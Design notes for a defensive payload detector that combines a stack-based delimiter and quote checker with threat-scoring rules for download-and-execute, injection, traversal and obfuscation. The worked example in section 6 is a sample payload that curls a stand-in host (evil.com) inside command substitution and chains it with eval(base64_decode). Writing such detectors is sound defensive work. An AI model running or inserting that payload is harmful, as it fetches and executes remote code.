# Payload PDA Detector: Implementation Notes

This document explains how the payload analyzer in `check_payload_pda` works and how the scope was expanded.

## 1. Why PDA Here

A payload string often contains nested structures like:
- command groups: `( ... )`
- script blocks: `{ ... }`
- array/object style nesting: `[ ... ]`
- quoting contexts: `'...'` and `"..."`

A finite-state check alone is weak for nested balancing. The function uses a stack, which is the core idea of a pushdown automaton (PDA):
- push opening delimiters
- pop and match on closing delimiters
- reject when closing symbols mismatch or stack is not empty at end

## 2. PDA Pieces in the Function

The function behaves like a deterministic PDA with extra threat heuristics.

- Input alphabet (simplified): payload characters
- Stack alphabet: `(`, `{`, `[`
- Control flags (finite state):
  - `in_single_quote`
  - `in_double_quote`
  - `escaped`
- Stack memory:
  - `stack[]`
  - `top`

### Transition Logic

For each character `c`:

1. Escape handling
- If current char is `\\` and previous char was not escape, set `escaped=1` and skip quote toggling for this step.

2. Quote-state transitions
- Toggle `in_single_quote` on `'` only when not in double quote and not escaped.
- Toggle `in_double_quote` on `"` only when not in single quote and not escaped.

3. Stack transitions (only outside quotes)
- On open delimiter `(`, `{`, `[`:
  - push to stack, update `max_depth`
- On close delimiter `)`, `}`, `]`:
  - check top of stack for matching opener
  - if mismatch or empty stack -> `mismatch=1`
  - else pop

4. Reset one-step escape flag
- `escaped=0` at end of the loop iteration (unless the iteration continued right after seeing `\\`).

## 3. PDA Acceptance vs Rejection

At end of scan:

Accepted structural state when all are true:
- `mismatch == 0`
- `top == -1` (stack empty)
- `in_single_quote == 0`
- `in_double_quote == 0`

Rejected/suspicious structural state when any is true:
- mismatched closing token
- unclosed delimiter in stack
- unclosed quote

That rejection contributes to rule: `Unbalanced Delimiters`.

## 4. Scoring Rules Added Around the PDA Core

The PDA core gives structure-aware validation. Scope is expanded with threat-pattern layers:

1. Structural/grammar pressure
- `Deep Nesting`
- `Chained Operators`
- `Operator Burst`
- `High Symbol Density`

2. Execution and staging indicators
- `Execution Token Cluster`
- `Execution Token Detected`
- `Download and Execute Pattern`
- `Remote Fetch Indicator`

3. Injection/traversal/persistence indicators
- `Injection Pattern Cluster`
- `Injection Primitive`
- `Path Traversal Pattern`
- `Persistence Indicator`

4. Obfuscation indicators
- `Command Substitution Pattern`
- `Obfuscation Encoding`
- `Excessive Escapes`
- `High Numeric Obfuscation`

## 5. Practical Interpretation

Think of the payload detector as two layers:

- Layer A (PDA):
  Validates nested syntax and quote-delimiter consistency using stack memory.

- Layer B (security heuristics):
  Scores suspicious behavior patterns (execution intent, fetch-and-run, obfuscation, traversal, injection, persistence).

Layer A reduces false negatives on malformed/obfuscated structure, while Layer B captures intent and technique.

## 6. Example Walkthrough

Payload:

`((($(curl http://evil.com)))) && eval(base64_decode)`

What happens:
- PDA stack depth grows due to nested `(` ... `)`
- Operator counting sees `&&` and other operator symbols
- Execution tokens hit: `curl`, `eval(`, `base64`
- Network token hit: `http://`
- Command substitution pattern hit: `$(`

Result: multiple high-signal rules trigger, score reaches malicious range.
